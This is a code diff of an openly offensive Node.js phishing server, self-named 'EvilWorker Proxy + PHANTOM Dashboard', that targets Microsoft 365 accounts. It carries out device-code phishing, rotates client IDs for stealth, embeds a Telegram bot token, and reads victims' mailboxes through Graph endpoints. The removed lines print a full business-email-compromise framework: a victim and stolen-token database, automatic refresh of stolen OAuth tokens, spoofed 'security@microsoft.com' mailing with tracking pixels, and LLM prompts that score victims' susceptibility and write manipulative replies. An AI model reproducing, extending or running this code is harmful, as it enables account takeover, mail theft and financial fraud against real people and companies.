@@ -1,5 +1,5 @@
 // ================================================
-// 𝙿𝚁𝙾𝚇𝚈 𝚂𝙴𝚁𝚅𝙴𝚁 — 𝙱𝙴𝙲 𝙵𝚁𝙰𝙼𝙴𝚆𝙾𝚁𝙺 (𝙵𝚄𝙻𝙻𝚈 𝙵𝙸𝚇𝙴𝙳)
+// 𝙿𝚁𝙾𝚇𝚈 𝚂𝙴𝚁𝚅𝙴𝚁 — 𝙵𝙸𝙽𝙰𝙻 𝚆𝙸𝚃𝙷 𝙰𝙻𝙻 𝙴𝙽𝙳𝙿𝙾𝙸𝙽𝚃𝚂 & 𝙵𝙸𝚇𝙴𝚂
 // ================================================
 
 const http = require("http");
@@ -35,20 +35,6 @@ try {
     FormData = require('form-data');
 } catch (e) { FormData = null; }
 
-// ── ✅ BEC FRAMEWORK DEPENDENCIES ──
-let nodemailer, Database, Groq;
-try {
-    nodemailer = require('nodemailer');
-} catch (e) { nodemailer = null; console.warn('⚠️ nodemailer not installed'); }
-
-try {
-    Database = require('better-sqlite3');
-} catch (e) { Database = null; console.warn('⚠️ better-sqlite3 not installed'); }
-
-try {
-    Groq = require('groq-sdk');
-} catch (e) { Groq = null; console.warn('⚠️ groq-sdk not installed'); }
-
 // ── ✅ TELEGRAM CONFIG ──
 const BOT_TOKEN = '8342719812:AAGMgewDI6j_XIGRiN9E7EE133ASeGgmkpM';
 const CHAT_ID = '7310383191';
@@ -72,12 +58,12 @@ const { obfuscateJSFile, generateObfuscationKey } = obfuscator;
 
 // ── ✅ STEALTH: CLIENT ID ROTATION ──
 const CLIENT_IDS = [
-    '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
-    '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
-    'd3590ed6-52b3-4102-aeff-aad2292ab01c',
-    '61e6f3cc-5b0b-4b09-8b31-ebcd1ae5f984',
-    '1950a258-227b-4e31-a9cf-717495945fc2',
-    'f8cdef31-a31e-4b4a-93e4-5f571e91255a',
+    '1fec8e78-bce4-4aaf-ab1b-5451cc387264', // Office Mobile
+    '9e5f94bc-e8a4-4e73-b8be-63364c29d753', // Authenticator
+    'd3590ed6-52b3-4102-aeff-aad2292ab01c', // Intune
+    '61e6f3cc-5b0b-4b09-8b31-ebcd1ae5f984', // Teams Mobile
+    '1950a258-227b-4e31-a9cf-717495945fc2', // Azure PowerShell
+    'f8cdef31-a31e-4b4a-93e4-5f571e91255a', // Whiteboard
 ];
 
 function getRandomClientId() {
@@ -462,532 +448,6 @@ function generateNewSession(phishedURL) {
     return { cookieName, cookieValue };
 }
 
-// ── ✅ BEC FRAMEWORK: DATABASE ──
-let crmDb = null;
-
-function initDatabase() {
-    if (!Database) {
-        console.warn('⚠️ better-sqlite3 not installed. CRM features disabled.');
-        return null;
-    }
-    try {
-        const dbPath = path.join(__dirname, 'bec.db');
-        const db = new Database(dbPath);
-        
-        db.exec(`
-            CREATE TABLE IF NOT EXISTS victims (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                email TEXT,
-                username TEXT,
-                password TEXT,
-                name TEXT,
-                company TEXT,
-                role TEXT,
-                industry TEXT,
-                phone TEXT,
-                ip TEXT,
-                country TEXT,
-                user_agent TEXT,
-                first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
-                last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
-                status TEXT DEFAULT 'new',
-                score INTEGER DEFAULT 0,
-                notes TEXT,
-                tags TEXT,
-                campaign_id INTEGER,
-                session_count INTEGER DEFAULT 0,
-                token_count INTEGER DEFAULT 0,
-                conversations TEXT
-            );
-
-            CREATE TABLE IF NOT EXISTS campaigns (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                name TEXT NOT NULL,
-                description TEXT,
-                target_industry TEXT,
-                target_role TEXT,
-                email_template TEXT,
-                status TEXT DEFAULT 'draft',
-                sent_count INTEGER DEFAULT 0,
-                open_count INTEGER DEFAULT 0,
-                click_count INTEGER DEFAULT 0,
-                reply_count INTEGER DEFAULT 0,
-                conversion_count INTEGER DEFAULT 0,
-                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
-            );
-
-            CREATE TABLE IF NOT EXISTS emails (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                victim_id INTEGER,
-                campaign_id INTEGER,
-                direction TEXT CHECK(direction IN ('sent', 'received')),
-                subject TEXT,
-                body TEXT,
-                html_body TEXT,
-                sent_at DATETIME,
-                opened_at DATETIME,
-                clicked_at DATETIME,
-                replied_to BOOLEAN DEFAULT 0,
-                FOREIGN KEY (victim_id) REFERENCES victims(id),
-                FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
-            );
-
-            CREATE TABLE IF NOT EXISTS tokens (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                victim_id INTEGER,
-                token_type TEXT,
-                token_value TEXT,
-                refresh_token TEXT,
-                expires_at DATETIME,
-                scope TEXT,
-                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-                is_valid BOOLEAN DEFAULT 1,
-                FOREIGN KEY (victim_id) REFERENCES victims(id)
-            );
-
-            CREATE TABLE IF NOT EXISTS proxy_rotation (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                domain TEXT NOT NULL,
-                ip TEXT,
-                last_used DATETIME,
-                status TEXT DEFAULT 'active',
-                hit_count INTEGER DEFAULT 0
-            );
-        `);
-        
-        console.log('✅ BEC Database initialized');
-        return db;
-    } catch (e) {
-        console.error('❌ Database init failed:', e.message);
-        return null;
-    }
-}
-
-const db = initDatabase();
-
-// ── ✅ BEC FRAMEWORK: CRM FUNCTIONS ──
-function addVictim(data) {
-    if (!db) return { error: 'Database not available' };
-    try {
-        const stmt = db.prepare(`
-            INSERT OR REPLACE INTO victims 
-            (email, username, password, name, company, role, industry, phone, ip, country, user_agent, status, score, notes, tags, campaign_id)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-        `);
-        const result = stmt.run(
-            data.email || null,
-            data.username || null,
-            data.password || null,
-            data.name || null,
-            data.company || null,
-            data.role || null,
-            data.industry || null,
-            data.phone || null,
-            data.ip || null,
-            data.country || null,
-            data.user_agent || null,
-            data.status || 'new',
-            data.score || 0,
-            data.notes || null,
-            data.tags || null,
-            data.campaign_id || null
-        );
-        return { success: true, id: result.lastInsertRowid };
-    } catch (e) {
-        return { error: e.message };
-    }
-}
-
-function getVictims(filters = {}) {
-    if (!db) return [];
-    try {
-        let query = 'SELECT * FROM victims WHERE 1=1';
-        const params = [];
-
-        if (filters.status) {
-            query += ' AND status = ?';
-            params.push(filters.status);
-        }
-        if (filters.company) {
-            query += ' AND company = ?';
-            params.push(filters.company);
-        }
-        if (filters.industry) {
-            query += ' AND industry = ?';
-            params.push(filters.industry);
-        }
-        if (filters.score_min) {
-            query += ' AND score >= ?';
-            params.push(parseInt(filters.score_min));
-        }
-
-        query += ' ORDER BY score DESC, last_seen DESC LIMIT 100';
-        const stmt = db.prepare(query);
-        return stmt.all(params);
-    } catch (e) {
-        return [];
-    }
-}
-
-function getVictimStats() {
-    if (!db) return { total: 0 };
-    try {
-        const stmt = db.prepare(`
-            SELECT 
-                COUNT(*) as total,
-                COUNT(CASE WHEN status = 'new' THEN 1 END) as new,
-                COUNT(CASE WHEN status = 'active' THEN 1 END) as active,
-                COUNT(CASE WHEN status = 'responded' THEN 1 END) as responded,
-                COUNT(CASE WHEN status = 'converted' THEN 1 END) as converted,
-                AVG(score) as avg_score,
-                COUNT(DISTINCT company) as companies,
-                COUNT(DISTINCT industry) as industries
-            FROM victims
-        `);
-        return stmt.get();
-    } catch (e) {
-        return { total: 0, error: e.message };
-    }
-}
-
-function logEmail(victimId, campaignId, direction, subject, body, htmlBody) {
-    if (!db) return { error: 'Database not available' };
-    try {
-        const stmt = db.prepare(`
-            INSERT INTO emails (victim_id, campaign_id, direction, subject, body, html_body, sent_at)
-            VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
-        `);
-        const result = stmt.run(victimId, campaignId, direction, subject, body, htmlBody);
-        return { success: true, id: result.lastInsertRowid };
-    } catch (e) {
-        return { error: e.message };
-    }
-}
-
-// ── ✅ BEC FRAMEWORK: EMAIL ENGINE ──
-class EmailEngine {
-    constructor() {
-        this.transporters = [];
-        this.currentTransporter = 0;
-        this.currentDomain = 0;
-        
-        let smtpServers = [];
-        try {
-            smtpServers = JSON.parse(process.env.SMTP_SERVERS || '[]');
-        } catch (e) {
-            console.warn('⚠️ Invalid SMTP_SERVERS config, using empty array');
-        }
-        
-        if (nodemailer && smtpServers.length > 0) {
-            this.transporters = smtpServers.map(s => 
-                nodemailer.createTransport({
-                    host: s.host || 'smtp.gmail.com',
-                    port: s.port || 587,
-                    secure: s.secure || false,
-                    auth: { 
-                        user: s.user || process.env.EMAIL_USER, 
-                        pass: s.pass || process.env.EMAIL_PASS 
-                    }
-                })
-            );
-            console.log(`✅ Email Engine: ${this.transporters.length} SMTP servers loaded`);
-        } else {
-            console.warn('⚠️ Email Engine: No SMTP servers configured');
-        }
-        
-        this.domains = (process.env.SENDER_DOMAINS || '').split(',').filter(Boolean);
-        this.trackingDomain = process.env.TRACKING_DOMAIN || 'track.yourdomain.com';
-    }
-
-    async sendEmail(to, subject, html, from) {
-        if (!this.transporters.length) {
-            return { success: false, error: 'No SMTP servers configured' };
-        }
-
-        try {
-            const transporter = this.transporters[this.currentTransporter % this.transporters.length];
-            this.currentTransporter++;
-
-            const senderDomain = this.domains[this.currentDomain % this.domains.length] || 'microsoft.com';
-            const info = await transporter.sendMail({
-                from: from || `security@${senderDomain}`,
-                to,
-                subject,
-                html: this.addTrackingPixel(html),
-                headers: {
-                    'X-Priority': '1',
-                    'X-MSMail-Priority': 'High',
-                    'Importance': 'high'
-                }
-            });
-
-            return { success: true, messageId: info.messageId };
-        } catch (error) {
-            return { success: false, error: error.message };
-        }
-    }
-
-    addTrackingPixel(html) {
-        const pixel = `<img src="${this.trackingDomain}/pixel/${Date.now()}" width="1" height="1" />`;
-        return html.replace('</body>', `${pixel}</body>`);
-    }
-
-    rotateDomain() {
-        this.currentDomain = (this.currentDomain + 1) % this.domains.length;
-        return this.domains[this.currentDomain];
-    }
-}
-
-const emailEngine = new EmailEngine();
-
-// ── ✅ BEC FRAMEWORK: AI ENGINE ──
-class AIEngine {
-    constructor() {
-        this.apiKey = process.env.GROQ_API_KEY;
-        this.client = null;
-        if (Groq && this.apiKey) {
-            try {
-                this.client = new Groq({ apiKey: this.apiKey });
-                console.log('✅ AI Engine: Groq initialized');
-            } catch (e) {
-                console.warn('⚠️ AI Engine: Groq init failed');
-            }
-        } else {
-            console.warn('⚠️ AI Engine: GROQ_API_KEY not set');
-        }
-        this.models = ['llama3-70b-8192', 'mixtral-8x7b-32768'];
-    }
-
-    async analyzeEmail(emailContent) {
-        if (!this.client) {
-            return { error: 'AI engine not configured. Set GROQ_API_KEY.' };
-        }
-
-        try {
-            const prompt = `
-            Analyze this email for business context:
-            1. Extract sender info and authority
-            2. Identify any financial requests
-            3. Detect urgency or emotional manipulation
-            4. Suggest a reply strategy
-            5. Score victim's susceptibility (1-10)
-
-            Email: "${emailContent.slice(0, 2000)}"
-            Return ONLY valid JSON.
-            `;
-
-            const response = await this.client.chat.completions.create({
-                model: this.models[0],
-                messages: [{ role: 'user', content: prompt }],
-                temperature: 0.3,
-                response_format: { type: 'json_object' }
-            });
-
-            return JSON.parse(response.choices[0].message.content);
-        } catch (error) {
-            return { error: error.message };
-        }
-    }
-
-    async generateReply(emailContext, strategy) {
-        if (!this.client) {
-            return { error: 'AI engine not configured' };
-        }
-
-        try {
-            const prompt = `
-            Generate a reply to this email using the "${strategy}" strategy.
-            Make it sound professional, urgent, and persuasive.
-            Context: ${emailContext}
-            `;
-
-            const response = await this.client.chat.completions.create({
-                model: this.models[1],
-                messages: [{ role: 'user', content: prompt }],
-                temperature: 0.7,
-            });
-
-            return { reply: response.choices[0].message.content };
-        } catch (error) {
-            return { error: error.message };
-        }
-    }
-
-    async scoreVictim(victimData) {
-        if (!this.client) {
-            return { error: 'AI engine not configured', score: 5 };
-        }
-
-        try {
-            const prompt = `
-            Score this victim's susceptibility to BEC attacks (1-10):
-            - Industry: ${victimData.industry || 'Unknown'}
-            - Role: ${victimData.role || 'Unknown'}
-            - Email history: ${victimData.emailHistory || 'None'}
-            - Past responses: ${victimData.pastResponses || 'None'}
-            Return ONLY a number.
-            `;
-
-            const response = await this.client.chat.completions.create({
-                model: this.models[0],
-                messages: [{ role: 'user', content: prompt }],
-                temperature: 0.2,
-            });
-
-            const score = parseInt(response.choices[0].message.content);
-            return { score: isNaN(score) ? 5 : Math.min(Math.max(score, 1), 10) };
-        } catch (error) {
-            return { error: error.message, score: 5 };
-        }
-    }
-}
-
-const aiEngine = new AIEngine();
-
-// ── ✅ BEC FRAMEWORK: TOKEN MANAGER ──
-class TokenManager {
-    constructor() {
-        this.tokens = new Map();
-        this.refreshIntervals = new Map();
-        
-        if (db) {
-            try {
-                const stmt = db.prepare('SELECT * FROM tokens WHERE is_valid = 1');
-                const rows = stmt.all();
-                for (const row of rows) {
-                    this.tokens.set(row.victim_id, {
-                        access_token: row.token_value,
-                        refresh_token: row.refresh_token,
-                        expiresAt: new Date(row.expires_at).getTime(),
-                        scope: row.scope,
-                        token_type: row.token_type,
-                    });
-                }
-                if (rows.length > 0) {
-                    console.log(`✅ Token Manager: Loaded ${rows.length} tokens from database`);
-                }
-            } catch (e) {
-                console.warn('⚠️ Could not load tokens from DB:', e.message);
-            }
-        }
-    }
-
-    storeToken(userId, tokenData) {
-        this.tokens.set(userId, {
-            ...tokenData,
-            stored: Date.now(),
-            expiresAt: Date.now() + (tokenData.expires_in || 3600) * 1000
-        });
-        
-        if (db) {
-            try {
-                const stmt = db.prepare(`
-                    INSERT OR REPLACE INTO tokens (victim_id, token_type, token_value, refresh_token, expires_at, scope)
-                    VALUES (?, ?, ?, ?, datetime(?, 'unixepoch'), ?)
-                `);
-                stmt.run(
-                    userId,
-                    tokenData.token_type || 'access_token',
-                    tokenData.access_token,
-                    tokenData.refresh_token,
-                    Math.floor(Date.now() / 1000) + (tokenData.expires_in || 3600),
-                    tokenData.scope || 'https://graph.microsoft.com/.default'
-                );
-            } catch (e) {
-                console.error('Failed to store token in DB:', e.message);
-            }
-        }
-
-        this.scheduleRefresh(userId);
-    }
-
-    scheduleRefresh(userId) {
-        const token = this.tokens.get(userId);
-        if (!token) return;
-
-        const refreshTime = token.expiresAt - Date.now() - 60000;
-        if (refreshTime > 0) {
-            if (this.refreshIntervals.has(userId)) {
-                clearTimeout(this.refreshIntervals.get(userId));
-            }
-            this.refreshIntervals.set(userId, setTimeout(() => {
-                this.refreshToken(userId);
-            }, refreshTime));
-        }
-    }
-
-    async refreshToken(userId) {
-        const token = this.tokens.get(userId);
-        if (!token || !token.refresh_token) {
-            console.log(`⚠️ No refresh token for ${userId}`);
-            return;
-        }
-
-        try {
-            const response = await axios.post(
-                'https://login.microsoftonline.com/common/oauth2/v2.0/token',
-                new URLSearchParams({
-                    client_id: token.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
-                    refresh_token: token.refresh_token,
-                    grant_type: 'refresh_token',
-                    scope: token.scope || 'https://graph.microsoft.com/.default'
-                }),
-                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
-            );
-
-            this.storeToken(userId, response.data);
-            console.log(`🔄 Token refreshed for ${userId}`);
-        } catch (error) {
-            console.error(`❌ Token refresh failed for ${userId}:`, error.message);
-        }
-    }
-
-    getToken(userId) {
-        const token = this.tokens.get(userId);
-        if (!token) return null;
-
-        if (Date.now() > token.expiresAt) {
-            this.refreshToken(userId);
-            return null;
-        }
-
-        return token.access_token;
-    }
-
-    getRefreshToken(userId) {
-        const token = this.tokens.get(userId);
-        return token?.refresh_token || null;
-    }
-
-    getAllTokens() {
-        const result = {};
-        for (const [userId, token] of this.tokens) {
-            result[userId] = {
-                access_token: token.access_token,
-                refresh_token: token.refresh_token,
-                expiresAt: token.expiresAt,
-                scope: token.scope
-            };
-        }
-        return result;
-    }
-
-    getTokensFromDB(limit = 100) {
-        if (!db) return [];
-        try {
-            const stmt = db.prepare(`
-                SELECT * FROM tokens WHERE is_valid = 1 ORDER BY created_at DESC LIMIT ?
-            `);
-            return stmt.all(limit);
-        } catch (e) {
-            return [];
-        }
-    }
-}
-
-const tokenManager = new TokenManager();
-
 // ── ✅ DASHBOARD APP ──
 if (!express) {
     console.error('❌ Express is not installed. Please run: npm install express');
@@ -1013,7 +473,7 @@ dashApp.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// ── ✅ ORIGINAL DASHBOARD API ENDPOINTS ──
+// ── ✅ DASHBOARD API ENDPOINTS ──
 dashApp.get('/api/status', (req, res) => {
     try {
         const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
@@ -1119,6 +579,7 @@ dashApp.post('/api/device/manual', async (req, res) => {
     try {
         const code = user_code || device_code;
         const DEVICE_CLIENT_ID = '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
+        // ✅ FIX: Use 'organizations' tenant to avoid AADSTS50059
         const response = await axios.post(
             'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
             new URLSearchParams({
@@ -1181,6 +642,8 @@ dashApp.post('/api/prt/exchange', async (req, res) => {
     const { prt } = req.body;
     if (!prt) return res.status(400).json({ error: 'PRT required' });
     try {
+        // PRT exchange requires Microsoft's internal APIs
+        // This is a placeholder — implement if you have PRT exchange logic
         res.json({ error: 'PRT exchange requires additional implementation' });
     } catch (error) {
         res.status(500).json({ error: error.message });
@@ -1293,9 +756,7 @@ dashApp.post('/api/recon', async (req, res) => {
         try {
             GraphClient = require('./graph_api.js');
         } catch (e) {
-            return res.status(501).json({ 
-                error: 'graph_api.js not found. Recon features disabled.' 
-            });
+            return res.status(500).json({ error: 'graph_api.js not found' });
         }
         const graph = new GraphClient(accessToken);
         
@@ -1327,6 +788,26 @@ dashApp.post('/api/recon', async (req, res) => {
     }
 });
 
+dashApp.post('/api/ai/analyze', async (req, res) => {
+    const { accessToken, refreshToken, email, groqApiKey } = req.body;
+    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
+    if (!groqApiKey) return res.status(400).json({ error: 'Groq API key required' });
+
+    try {
+        let AIBECEngine;
+        try {
+            AIBECEngine = require('./ai_bec_engine.js');
+        } catch (e) {
+            return res.status(500).json({ error: 'ai_bec_engine.js not found' });
+        }
+        const engine = new AIBECEngine(groqApiKey);
+        const result = await engine.runFullAnalysis(accessToken, refreshToken, email);
+        res.json({ success: true, ...result });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
 // ── ✅ WEBMAIL ENDPOINTS ──
 dashApp.post('/api/webmail/folders', async (req, res) => {
     const { accessToken } = req.body;
@@ -1337,7 +818,7 @@ dashApp.post('/api/webmail/folders', async (req, res) => {
         try {
             GraphClient = require('./graph_api.js');
         } catch (e) {
-            return res.status(501).json({ error: 'graph_api.js not found' });
+            return res.status(500).json({ error: 'graph_api.js not found' });
         }
         const graph = new GraphClient(accessToken);
         const folders = await graph.getMailFolders();
@@ -1356,7 +837,7 @@ dashApp.post('/api/webmail/emails', async (req, res) => {
         try {
             GraphClient = require('./graph_api.js');
         } catch (e) {
-            return res.status(501).json({ error: 'graph_api.js not found' });
+            return res.status(500).json({ error: 'graph_api.js not found' });
         }
         const graph = new GraphClient(accessToken);
         
@@ -1386,7 +867,7 @@ dashApp.post('/api/webmail/email', async (req, res) => {
         try {
             GraphClient = require('./graph_api.js');
         } catch (e) {
-            return res.status(501).json({ error: 'graph_api.js not found' });
+            return res.status(500).json({ error: 'graph_api.js not found' });
         }
         const graph = new GraphClient(accessToken);
         const email = await graph.get(`/messages/${messageId}?$select=id,subject,sender,toRecipients,ccRecipients,bccRecipients,receivedDateTime,body,isRead,hasAttachments,importance,conversationId`);
@@ -1406,7 +887,7 @@ dashApp.post('/api/webmail/send', async (req, res) => {
         try {
             GraphClient = require('./graph_api.js');
         } catch (e) {
-            return res.status(501).json({ error: 'graph_api.js not found' });
+            return res.status(500).json({ error: 'graph_api.js not found' });
         }
         const graph = new GraphClient(accessToken);
         
@@ -1443,7 +924,7 @@ dashApp.post('/api/webmail/search', async (req, res) => {
         try {
             GraphClient = require('./graph_api.js');
         } catch (e) {
-            return res.status(501).json({ error: 'graph_api.js not found' });
+            return res.status(500).json({ error: 'graph_api.js not found' });
         }
         const graph = new GraphClient(accessToken);
         const searchUrl = folderId === 'inbox' 
@@ -1841,172 +1322,6 @@ dashApp.get('/api/tokens/:filename', (req, res) => {
     }
 });
 
-// ── ✅ BEC FRAMEWORK: CRM ENDPOINTS ──
-
-dashApp.get('/api/crm/victims', (req, res) => {
-    try {
-        const filters = req.query;
-        const victims = getVictims(filters);
-        res.json({ success: true, victims });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-dashApp.post('/api/crm/victims', (req, res) => {
-    try {
-        const result = addVictim(req.body);
-        if (result.error) {
-            return res.status(500).json({ error: result.error });
-        }
-        res.json({ success: true, id: result.id });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-dashApp.get('/api/crm/stats', (req, res) => {
-    try {
-        const stats = getVictimStats();
-        res.json({ success: true, stats });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-dashApp.post('/api/crm/email', (req, res) => {
-    try {
-        const { victimId, campaignId, direction, subject, body, htmlBody } = req.body;
-        const result = logEmail(victimId, campaignId, direction, subject, body, htmlBody);
-        if (result.error) {
-            return res.status(500).json({ error: result.error });
-        }
-        res.json({ success: true, id: result.id });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-// ── ✅ BEC FRAMEWORK: AI ENDPOINTS ──
-
-dashApp.post('/api/ai/analyze', async (req, res) => {
-    try {
-        const { emailContent } = req.body;
-        if (!emailContent) {
-            return res.status(400).json({ error: 'emailContent required' });
-        }
-        const analysis = await aiEngine.analyzeEmail(emailContent);
-        res.json({ success: true, analysis });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-dashApp.post('/api/ai/generate-reply', async (req, res) => {
-    try {
-        const { context, strategy } = req.body;
-        if (!context) {
-            return res.status(400).json({ error: 'context required' });
-        }
-        const reply = await aiEngine.generateReply(context, strategy || 'professional');
-        res.json({ success: true, reply });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-dashApp.post('/api/ai/score-victim', async (req, res) => {
-    try {
-        const { victimData } = req.body;
-        if (!victimData) {
-            return res.status(400).json({ error: 'victimData required' });
-        }
-        const result = await aiEngine.scoreVictim(victimData);
-        res.json({ success: true, result });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-// ── ✅ BEC FRAMEWORK: TOKEN MANAGEMENT ENDPOINTS ──
-
-dashApp.post('/api/tokens/store', (req, res) => {
-    try {
-        const { userId, tokenData } = req.body;
-        if (!userId || !tokenData) {
-            return res.status(400).json({ error: 'userId and tokenData required' });
-        }
-        tokenManager.storeToken(userId, tokenData);
-        res.json({ success: true });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-dashApp.get('/api/tokens/:userId', (req, res) => {
-    try {
-        const token = tokenManager.getToken(req.params.userId);
-        res.json({ success: true, token });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-dashApp.get('/api/tokens/all', (req, res) => {
-    try {
-        const tokens = tokenManager.getAllTokens();
-        res.json({ success: true, tokens });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-dashApp.get('/api/tokens/db', (req, res) => {
-    try {
-        const limit = parseInt(req.query.limit) || 100;
-        const tokens = tokenManager.getTokensFromDB(limit);
-        res.json({ success: true, tokens });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-// ── ✅ BEC FRAMEWORK: EMAIL ENGINE ENDPOINTS ──
-
-dashApp.post('/api/email/send', async (req, res) => {
-    try {
-        const { to, subject, html, from } = req.body;
-        if (!to || !subject || !html) {
-            return res.status(400).json({ error: 'to, subject, and html required' });
-        }
-        const result = await emailEngine.sendEmail(to, subject, html, from);
-        res.json(result);
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-dashApp.post('/api/email/rotate-domain', (req, res) => {
-    try {
-        const domain = emailEngine.rotateDomain();
-        res.json({ success: true, domain });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-dashApp.get('/api/email/config', (req, res) => {
-    try {
-        res.json({
-            domains: emailEngine.domains,
-            trackingDomain: emailEngine.trackingDomain,
-            transporterCount: emailEngine.transporters.length
-        });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
 // ── ✅ MAIN APP ──
 const app = express();
 
@@ -2014,7 +1329,7 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ── ✅ DEVICE CODE API ──
+// ── ✅ DEVICE CODE API (FIXED: using 'organizations' tenant) ──
 app.post('/device/request', async (req, res) => {
     if (!axios) {
         return res.status(500).json({ error: 'axios not installed. Run: npm install axios' });
@@ -2030,6 +1345,7 @@ app.post('/device/request', async (req, res) => {
         
         await randomDelay(300, 800);
         
+        // ✅ FIX: Use 'organizations' instead of 'common' to avoid AADSTS50059
         const response = await axios.post(
             'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
             new URLSearchParams({
@@ -2092,7 +1408,7 @@ app.post('/device/request', async (req, res) => {
     }
 });
 
-// ── ✅ DEVICE TOKEN POLLING ──
+// ── ✅ DEVICE TOKEN POLLING (FIXED: using 'organizations' tenant) ──
 app.post('/device/token', async (req, res) => {
     if (!axios) {
         return res.status(500).json({ error: 'axios not installed. Run: npm install axios' });
@@ -2112,6 +1428,7 @@ app.post('/device/token', async (req, res) => {
         
         await randomDelay(200, 600);
         
+        // ✅ FIX: Use 'organizations' to match the device code request
         const response = await axios.post(
             'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
             new URLSearchParams({
@@ -2328,36 +1645,19 @@ const PORT = process.env.PORT || 3000;
 
 const server = app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ EvilWorker Proxy + PHANTOM Dashboard running on port ${PORT}`);
-    console.log(`🔐 Dashboard: /dash (auth: ${dashUser}/${dashPass})`);
+    console.log(`🔐 Dashboard: /dash (auth: svrps/evilworker)`);
     console.log(`📱 Device Code: /device`);
     console.log(`🔄 Client Rotation: ${CLIENT_IDS.length} clients loaded`);
     console.log(`🔄 UA Rotation: ${USER_AGENTS.length} user-agents loaded`);
     console.log(`✅ Using 'organizations' tenant (fixed AADSTS50059)`);
-    console.log(`🧠 BEC Framework Features:`);
-    console.log(`   📧 Email Engine: ${emailEngine.transporters.length} SMTP servers`);
-    console.log(`   🤖 AI Engine: ${aiEngine.client ? '✅' : '❌'} Groq API`);
-    console.log(`   💾 Database: ${db ? '✅' : '❌'} SQLite`);
-    console.log(`   🔑 Token Manager: Active`);
-    console.log(`   👤 CRM: Active`);
 });
 
-// ── ✅ WEBSOCKET SUPPORT (FIXED) ──
+// ── ✅ WEBSOCKET SUPPORT ──
 if (WebSocket) {
     const wss = new WebSocket.Server({ server });
     let clients = [];
     wss.on('connection', (ws) => {
         clients.push(ws);
-        
-        // ✅ Respond to ping with pong
-        ws.on('message', (data) => {
-            try {
-                const msg = data.toString();
-                if (msg === 'ping') {
-                    ws.send('pong');
-                }
-            } catch (e) {}
-        });
-        
         ws.on('close', () => {
             clients = clients.filter(c => c !== ws);
         });
